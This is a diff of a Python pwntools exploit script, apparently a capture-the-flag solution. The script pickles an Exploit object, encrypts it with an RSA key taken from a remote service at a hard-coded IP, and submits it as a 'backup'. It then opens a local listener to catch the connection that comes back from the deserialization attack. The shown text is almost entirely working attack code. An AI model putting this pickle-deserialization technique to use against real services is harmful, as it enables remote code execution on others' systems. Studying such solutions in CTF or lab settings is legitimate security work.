@@ -14,16 +14,19 @@ class Exploit(object):
 def main():
     l = listen(port=1234)
     s = remote('140.113.194.85', 49167)
-    s.sendline('6')
-    key = s.recvline()
+    print s.recvuntil('6) Show the key\n')
+    s.send('6\n')
+    key = s.recvuntil(')')
     key = re.findall("(\d*, \d*)", key)
     if key != []:
         key = key[0].split(',')
-        print key
-        c = l.wait_for_connection()
-        s.sendline(rsa.encrypt(pickle.dumps(Exploit()), rsa.PublicKey(int(key[0]), int(key[1]))).encode('base64'))
-        print c.recv()
-
+        fake = rsa.encrypt(pickle.dumps(Exploit()), rsa.PublicKey(int(key[0]), int(key[1]))).encode('base64').replace('\n', '')
+        print fake
+        print s.recvuntil('6) Show the key\n')
+        s.send('5\n')
+        print s.recvuntil('Paste your backup here: ')
+        s.send(fake+'\n')
+        print l.wait_for_connection().recv()
 
 if __name__ == '__main__':
     main()
